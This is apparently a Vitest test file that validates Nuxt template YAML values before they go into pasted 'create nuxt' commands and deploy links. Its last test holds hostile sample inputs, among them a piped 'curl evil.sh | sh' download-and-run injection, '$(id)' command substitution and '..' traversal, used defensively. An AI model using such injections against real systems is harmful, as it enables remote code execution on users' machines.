import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { parseYAML } from 'confbox'
import { describe, expect, it } from 'vitest'

const dir = join(import.meta.dirname, '../../content/templates')
const templates = readdirSync(dir, { recursive: true, encoding: 'utf8' })
  .filter(file => file.endsWith('.yml'))
  .map(file => ({ file, data: parseYAML<Record<string, any>>(readFileSync(join(dir, file), 'utf8')) }))

const SEGMENT = /^(?!\.{1,2}$)[\w.-]+$/

function segments(value: string, count?: number) {
  const parts = value.split('/')
  return (count === undefined || parts.length === count) && parts.every(part => SEGMENT.test(part))
}

function isHttps(value: string) {
  try {
    return new URL(value).protocol === 'https:'
  } catch {
    return false
  }
}

// These values go into the `create nuxt` command visitors paste into a terminal, into deploy links and into the daily check's sandbox commands.
describe('template content', () => {
  it.each(templates)('$file only uses safe values', ({ data }) => {
    expect(data.slug).toMatch(/^[a-z0-9]+(?:-[a-z0-9]+)*$/)
    if (data.category !== undefined) expect(['saas', 'dashboard', 'ai', 'docs', 'content', 'landing', 'portfolio', 'ecommerce', 'app']).toContain(data.category)
    if (data.official !== undefined) expect(typeof data.official).toBe('boolean')
    if (data.template !== undefined) expect(data.template).toMatch(/^[a-z0-9]+(?:-[a-z0-9]+)*$/)
    if (data.repo !== undefined) expect(segments(data.repo, 2)).toBe(true)
    if (data.branch !== undefined) expect(segments(data.branch)).toBe(true)
    if (data.source !== undefined) expect(data.source.startsWith('gh:') && data.source.split('/').length >= 3 && segments(data.source.slice(3))).toBe(true)
    for (const key of ['demo', 'purchase']) {
      if (data[key] !== undefined) expect(isHttps(data[key]), key).toBe(true)
    }
    if (data.deploy?.repositoryUrl !== undefined) {
      const [, repo, tree] = data.deploy.repositoryUrl.match(/^https:\/\/github\.com\/([^/]+\/[^/]+)(?:\/tree\/(.+))?$/) ?? []
      expect(repo !== undefined && segments(repo, 2) && (tree === undefined || segments(tree)), 'deploy.repositoryUrl').toBe(true)
    }
    if (data.deploy?.env !== undefined) {
      expect(Array.isArray(data.deploy.env), 'deploy.env').toBe(true)
      for (const name of data.deploy.env) expect(name).toMatch(/^[A-Z][A-Z0-9_]*$/)
    }
  })

  it('rejects shell syntax and parent directories', () => {
    expect(segments('owner/repo; curl evil.sh | sh', 2)).toBe(false)
    expect(segments('owner/$(id)', 2)).toBe(false)
    expect(segments('owner/..', 2)).toBe(false)
    expect(segments('nuxt/starter', 2)).toBe(true)
    expect(segments('main/../other')).toBe(false)
  })
})
